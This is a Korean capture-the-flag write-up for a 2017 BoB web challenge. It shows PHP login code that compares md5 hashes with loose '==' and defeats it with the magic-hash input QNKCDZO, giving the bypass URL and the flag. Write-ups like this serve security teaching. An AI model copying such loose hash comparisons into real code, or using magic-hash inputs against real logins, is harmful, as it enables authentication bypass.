# [2017_BOB] \[WEB] hc

###Problem

서버 - http://wemeet.linears.xyz/hc

```php
login failed..
<?php 
include("./config.php"); 

if (preg_match("/[0-9]/", $_GET['pw'])) die('no hack!'); 
if ($_GET['id'] == 'admin' && md5($_GET['pw']) == '0e417203217309127312097309263112') 
{ 
   echo 'hi admin<br />'; 
   clear(); 
} 
else if ($_GET['id'] == 'guest' && md5($_GET['pw']) == '084e0343a0486ff05530df6c705c8bb4') echo 'hi guest<br />'; 
else echo 'login failed..'; 
echo '<hr />'; 
show_source(__FILE__); 
?>
```

접속해보면 위와 같이 뜬다. PHP Magic Hash 취약점이 발생할 것 같다..



### Solution

id를 admin으로 설정하고, 240610708 또는 QNKCDZO 를 pw로 넣어주면 되는데 숫자는 필터링된다. 따라서 QNKCDZO를 넣어주면 된다. (http://wemeet.linears.xyz/hc?id=admin&pw=QNKCDZO)

```php
hi admin
Flag is d17f8594fa0834cff6540e00dafa4fac
<?php 
include("./config.php"); 

if (preg_match("/[0-9]/", $_GET['pw'])) die('no hack!'); 
if ($_GET['id'] == 'admin' && md5($_GET['pw']) == '0e417203217309127312097309263112') 
{ 
   echo 'hi admin<br />'; 
   clear(); 
} 
else if ($_GET['id'] == 'guest' && md5($_GET['pw']) == '084e0343a0486ff05530df6c705c8bb4') echo 'hi guest<br />'; 
else echo 'login failed..'; 
echo '<hr />'; 
show_source(__FILE__); 
?>
```

